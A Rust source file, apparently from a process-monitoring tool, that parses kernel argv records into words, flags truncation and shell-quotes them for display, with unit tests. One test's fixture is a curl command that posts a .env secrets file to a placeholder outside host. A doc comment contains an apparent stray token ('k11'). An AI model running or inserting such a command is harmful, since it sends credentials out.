//! Command lines from exec records and /proc.
//!
//! argv comes as the kernel laid it out, NUL-separated words, possibly cut
//! at `ARGS_LEN`. It is kept as words and shown shell-quoted, so an argument
//! with spaces stays one and a line can be pasted back into a shell.

use std::borrow::Cow;
use std::fmt;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandLine {
    pub args: Vec<String>,
    /// The process had more than k11 kept.
    pub cut: bool,
}

impl CommandLine {
    /// `bytes` as copied, `whole_len` as the kernel counted it. None when
    /// nothing was copied.
    pub fn parse(bytes: &[u8], whole_len: usize) -> Option<Self> {
        if bytes.is_empty() {
            return None;
        }
        let body = bytes.strip_suffix(&[0]).unwrap_or(bytes);
        Some(Self {
            args: body
                .split(|&b| b == 0)
                .map(|w| String::from_utf8_lossy(w).into_owned())
                .collect(),
            cut: whole_len > bytes.len(),
        })
    }

    /// Everything after argv[0], which the caller chooses freely: a line
    /// for people names the binary itself instead.
    pub fn arguments(&self) -> Words<'_> {
        Words(self.args.get(1..).unwrap_or_default(), self.cut)
    }
}

impl fmt::Display for CommandLine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        Words(&self.args, self.cut).fmt(f)
    }
}

/// Shell-quoted words; a cut line ends in "...".
pub struct Words<'a>(&'a [String], bool);

impl Words<'_> {
    pub fn is_empty(&self) -> bool {
        self.0.is_empty() && !self.1
    }
}

impl fmt::Display for Words<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        for (i, word) in self.0.iter().enumerate() {
            if i > 0 {
                f.write_str(" ")?;
            }
            f.write_str(&quote(word))?;
        }
        if self.1 {
            f.write_str("...")?;
        }
        Ok(())
    }
}

fn quote(word: &str) -> Cow<'_, str> {
    let plain = |b: u8| b.is_ascii_alphanumeric() || b"_-./=:@%+,".contains(&b);
    if !word.is_empty() && word.bytes().all(plain) {
        Cow::Borrowed(word)
    } else {
        Cow::Owned(format!("'{}'", word.replace('\'', r"'\''")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(bytes: &[u8]) -> CommandLine {
        CommandLine::parse(bytes, bytes.len()).unwrap()
    }

    #[test]
    fn words_are_quoted_only_when_a_shell_needs_it() {
        let c = line(b"curl\0-d\0@.env\0https://x.example/a?b=c\0");
        assert_eq!(c.to_string(), "curl -d @.env 'https://x.example/a?b=c'");
        assert_eq!(
            c.arguments().to_string(),
            "-d @.env 'https://x.example/a?b=c'"
        );
        let c = line(b"bash\0-c\0echo 'hi' > /tmp/x\0\0");
        assert_eq!(c.to_string(), r"bash -c 'echo '\''hi'\'' > /tmp/x' ''");
    }

    #[test]
    fn a_cut_line_says_so() {
        let c = CommandLine::parse(b"python3\0-c\0impo", 5000).unwrap();
        assert_eq!(c.args, ["python3", "-c", "impo"]);
        assert_eq!(c.to_string(), "python3 -c impo...");
    }

    #[test]
    fn nothing_copied_is_no_line() {
        assert_eq!(CommandLine::parse(b"", 0), None);
        assert!(line(b"true\0").arguments().is_empty());
    }
}
